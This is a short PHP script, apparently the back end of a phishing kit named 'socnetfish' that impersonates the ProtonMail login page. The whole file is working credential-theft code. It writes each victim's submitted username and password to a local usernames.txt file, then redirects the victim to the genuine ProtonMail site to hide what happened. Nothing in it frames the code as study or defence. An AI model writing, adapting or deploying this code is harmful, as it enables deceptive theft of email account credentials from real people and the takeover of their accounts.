<?php

$usuario = exec('whoami');

file_put_contents("/home/".$usuario."/.config/socnetfish/usernames.txt","\n" . "ProtonMail" . "\n" . "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://mail.protonmail.com');
exit();
